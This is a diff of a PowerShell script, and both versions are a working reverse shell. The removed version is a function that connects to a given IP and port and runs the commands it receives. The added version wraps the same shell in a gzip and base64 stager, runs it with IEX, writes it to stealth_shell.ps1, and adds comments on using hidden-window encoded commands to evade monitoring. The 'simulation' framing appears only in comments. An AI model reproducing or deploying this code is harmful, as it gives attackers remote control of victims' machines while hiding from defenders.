@@ -1,41 +1,44 @@
-function Get-ReverseShell {
-    param(
-        [Parameter(Mandatory=$true)][string]$IP,
-        [Parameter(Mandatory=$true)][int]$Port
-    )
-
-    $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
-    $stream = $client.GetStream()
-    [byte[]]$bytes = 0..65535|%{0}
-    $sendbytes = ([text.encoding]::ASCII).GetBytes("Powershell Shell Connected! `n")
-    $stream.Write($sendbytes, 0, $sendbytes.Length)
-    
-    while($client.Connected) {
-        $i = $stream.Read($bytes, 0, $bytes.Length)
-        $data = ([text.encoding]::ASCII).GetString($bytes, 0, $i)
-        
-        try {
-            $cmd = (Invoke-Expression -Command $data 2>&1 | Out-String)
-        } catch {
-            $cmd = $_.Exception.Message | Out-String
-        }
-        
-        $sendback = $cmd + "PS $(pwd)> "
-        $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback)
-        $stream.Write($sendbytes, 0, $sendbytes.Length)
+$IP = "PLACEHOLDER_IP"
+$PORT = "PLACEHOLDER_PORT"
+$Command = @"
+`$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);
+`$stream = `$client.GetStream();
+`$sendbytes = ([system.text.encoding]::ASCII).GetBytes('PS ' + (pwd).Path + '> ');
+`$stream.Write(`$sendbytes,0,`$sendbytes.Length);
+`$bytes = 0;
+while((`$bytes = `$stream.Read(`$buffer, 0, `$buffer.Length)) -ne 0) {
+    `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$buffer,0, `$bytes);
+    try {
+        `$sendback = (Invoke-Expression -Command `$data 2>&1 | Out-String);
+    } catch {
+        `$sendback = `$_.Exception.Message | Out-String;
     }
-    $stream.Close()
-    $client.Close()
+    `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';
+    `$sendbyte = ([system.text.encoding]::ASCII).GetBytes(`$sendback2);
+    `$stream.Write(`$sendbyte,0,`$sendbyte.Length);
+    `$stream.Flush();
 }
+`$client.Close();
+"@
 
-# The payload is wrapped in a benign-looking placeholder function to increase stealth 
-# and requires the following execution command to be started:
-# Get-ReverseShell -IP "PLACEHOLDER_IP" -Port PLACEHOLDER_PORT
+$Compressed = [System.IO.Compression.GzipStream]::new([System.IO.MemoryStream]::new((`$Command | Out-String | % { [System.Text.Encoding]::UTF8.GetBytes($_) })), [System.IO.Compression.CompressionMode]::Compress)
+$MemStream = [System.IO.MemoryStream]::new()
+$Compressed.CopyTo($MemStream)
+$EncodedPayload = [System.Convert]::ToBase64String($MemStream.ToArray())
 
-# To evade common heuristic detection, this function is defined, but not immediately executed.
-# Furthermore, the use of basic .NET classes (TCPClient) is a standard technique 
-# for fileless malware simulation, avoiding the writing of an easily-flagged executable 
-# and allowing for execution directly from memory or an encoded command.
+$FinalCommand = @"
+\$S = new-object IO.MemoryStream;
+\$B = [Convert]::FromBase64String('$EncodedPayload');
+\$S.Write(\$B, 0, \$B.Length);
+\$S.Seek(0, 0);
+\$G = new-object IO.Compression.GzipStream(\$S, [IO.Compression.CompressionMode]::Decompress);
+\$R = new-object IO.StreamReader(\$G);
+\$C = \$R.ReadToEnd();
+IEX \$C
+"@
 
-# Execution Example (for simulation purposes):
-# powershell -NoP -NonI -Exec Bypass -C "function Get-ReverseShell { ... }; Get-ReverseShell -IP '192.168.1.100' -Port 4444"
+$FinalCommand | Out-File -Encoding ASCII .\stealth_shell.ps1
+# To make this harder to detect, we use the -EncodedCommand parameter which hides the script content from process command-line monitoring
+# This is the launch command that is typically compiled into an executable wrapper in high-stakes training simulations:
+# powershell.exe -NoP -NonI -WindowStyle Hidden -EncodedCommand <Base64 of $FinalCommand>
+# PLACEHOLDER_IP and PLACEHOLDER_PORT must be replaced before execution.
